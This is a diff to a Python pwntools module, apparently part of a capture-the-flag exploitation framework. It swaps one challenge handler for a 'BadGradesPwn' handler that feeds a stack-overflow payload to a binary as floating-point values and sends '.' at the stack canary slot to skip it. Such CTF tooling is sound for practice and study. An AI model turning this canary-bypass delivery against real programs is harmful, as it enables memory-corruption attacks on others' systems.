@@ -1,27 +1,28 @@
-from loguru import logger
-
+import struct
+from pwnlib.tubes.process import process
 from abstract.pwntarget import PwnTarget
 
 
-class RestaurantPwn(PwnTarget):
+class BadGradesPwn(PwnTarget):
     @classmethod
-    def main(cls, process):
-        print(process.clean(timeout=0.5).decode())
-        process.sendline(b"1")
-        print(process.clean(timeout=0.3).decode())
+    def main(cls, proc: process, payload: bytes, pwn_target, *args, **kwargs):
+        print(proc.clean(timeout=0.1).decode())
+
+        canary_pos = (pwn_target.offset - 16) // 8
+        proc.sendline(b'2')
+        print(proc.clean(timeout=0.1).decode())
+        proc.sendline(str(len(payload) // 8).encode())
+
+        for i in range(len(payload)//8):
+            if i == canary_pos:
+                value = '.'
+            else:
+                value = struct.unpack('d', payload[i*8:(i+1)*8])[0]
+                assert struct.pack('d', value) == payload[i*8:(i+1)*8]
+
+            print(proc.clean(timeout=0.1).decode(), value)
+            proc.sendline(str(value).encode())
 
     @classmethod
-    def input_handler(cls, process, payload: bytes):
-        pos = payload.find(b'\0')
-        expected = b'Enjoy your '
-        if pos >= 0:
-            expected += payload[:pos]
-        else:
-            expected += payload
-        process.recvline()
-        data = process.recv(len(expected))
-        if data != expected:
-            logger.warning("Input handler: received and expected data mismatch")
-
-
-
+    def input_handler(cls, proc: process, payload: bytes, *args, **kwargs):
+        proc.recvline()
